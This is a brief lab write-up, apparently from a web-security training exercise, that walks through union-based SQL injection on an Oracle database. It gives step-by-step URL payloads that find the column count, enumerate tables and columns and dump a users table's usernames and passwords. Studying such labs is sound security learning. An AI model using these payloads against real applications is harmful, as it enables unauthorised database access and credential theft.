# Listing the database contents on Oracle

`/filter?category=Pets'+UNION+SELECT+NULL+FROM+dual--`: Internal Server Error

`/filter?category=Pets'+UNION+SELECT+NULL,+NULL+FROM+dual--`: Ok (2 columns)

Get tables list:

`/filter?category=Pets'+UNION+SELECT+table_name,+owner+FROM+all_tables--`

Users table name is `USERS_TMEMJL` (suffix is random).

Get users table columns list:

`/filter?category=Pets'+UNION+SELECT+column_name,+data_type+FROM+all_tab_columns+WHERE+table_name='USERS_TMEMJL'--`

Users table has two columns: `USERNAME_TPVCRN` and `PASSWORD_XMYDGK` (suffix is random).

Get users with passwords:

`/filter?category=Pets'+UNION+SELECT+USERNAME_TPVCRN,+PASSWORD_XMYDGK+FROM+USERS_TMEMJL--`

Solved.
